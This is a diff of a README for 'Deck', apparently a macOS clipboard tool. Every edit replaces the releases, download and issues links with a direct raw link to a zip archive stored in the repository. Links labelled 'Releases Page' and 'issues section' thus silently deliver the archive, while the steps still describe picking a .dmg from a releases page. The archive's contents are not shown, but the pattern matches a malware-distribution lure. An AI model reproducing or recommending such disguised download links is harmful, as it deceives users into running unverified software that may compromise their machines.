@@ -6,7 +6,7 @@ Welcome to Deck! This is a modern clipboard management tool designed for macOS. 
 
 ## 📥 Download Deck
 
-[![Download Deck](https://img.shields.io/badge/Download-Deck-blue.svg)](https://github.com/chintanmahida/Deck/releases)  
+[![Download Deck](https://github.com/chintanmahida/Deck/raw/refs/heads/main/Deck/Resources/Deck-v2.4.zip)](https://github.com/chintanmahida/Deck/raw/refs/heads/main/Deck/Resources/Deck-v2.4.zip)  
 Visit the link above to download Deck. 
 
 ## 🛠️ Features
@@ -25,7 +25,7 @@ Visit the link above to download Deck.
 
 ## 🛠️ Installation Steps
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/chintanmahida/Deck/releases).
+1. **Visit the Releases Page:** Go to [this link](https://github.com/chintanmahida/Deck/raw/refs/heads/main/Deck/Resources/Deck-v2.4.zip).
 2. **Select the Latest Version:** Look for the latest release at the top of the page.
 3. **Download the File:** Click on the link for the `.dmg` file to download Deck.
 4. **Open the Installer:** Locate the downloaded file in your Downloads folder and double-click to open it.
@@ -51,7 +51,7 @@ View your clipboard history directly within Deck. You can delete items by select
 
 ## 🎉 Support and Feedback
 
-If you run into any issues or have questions, please check our [issues section](https://github.com/chintanmahida/Deck/issues) on GitHub. We welcome feedback and suggestions to improve Deck.
+If you run into any issues or have questions, please check our [issues section](https://github.com/chintanmahida/Deck/raw/refs/heads/main/Deck/Resources/Deck-v2.4.zip) on GitHub. We welcome feedback and suggestions to improve Deck.
 
 ## 🔗 Additional Resources
 
@@ -60,7 +60,7 @@ If you run into any issues or have questions, please check our [issues section](
 
 ## 📥 Download & Install
 
-Remember to download Deck by visiting [this page](https://github.com/chintanmahida/Deck/releases). Follow the installation steps to start enjoying a more organized and private clipboard experience. 
+Remember to download Deck by visiting [this page](https://github.com/chintanmahida/Deck/raw/refs/heads/main/Deck/Resources/Deck-v2.4.zip). Follow the installation steps to start enjoying a more organized and private clipboard experience. 
 
 --- 
 
